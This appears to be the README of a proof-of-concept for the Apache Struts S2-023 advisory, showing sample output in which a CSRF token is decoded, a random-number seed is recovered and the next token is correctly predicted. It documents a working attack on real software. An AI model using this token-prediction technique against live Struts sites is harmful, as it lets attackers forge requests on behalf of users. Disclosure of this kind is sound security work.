Proof of concept code to predict Struts CSRF token. [[S2-023](http://struts.apache.org/docs/s2-023.html)]


**Execution preview**

    == Initial token
    H6P3Y3GHIC2865ASZVQ913NR93QZO7BR
    == Initial token in hex (easier evaluation)
    14b08fcbf6523eecd7dd7d3e89cf97d6f478db5617

    Guessing part..
    == bytes representation (reconstructed byte array)
    14b08fcb
    f6523eec
    d7dd7d3e
    89cf97d6
    f478db56
    Seed found: 259752424024079
    == following int .. (should match the initial token last part) 
    d7dd7d3e
    89cf97d6
    f478db56
    175a6e1c
    == (prediction) Next token 
    1590c1573a30295e6d87082bf2c389f575f5fcfa3890b8ac

    == (actual) Next token
    HWVVZO2VGBZOYD0QFWE8GU3BW4DCRVW8
    == (actual) Next token in hex (easier evaluation)
    1590c1573a30295e6d87082bf2c389f575f5fcfa38
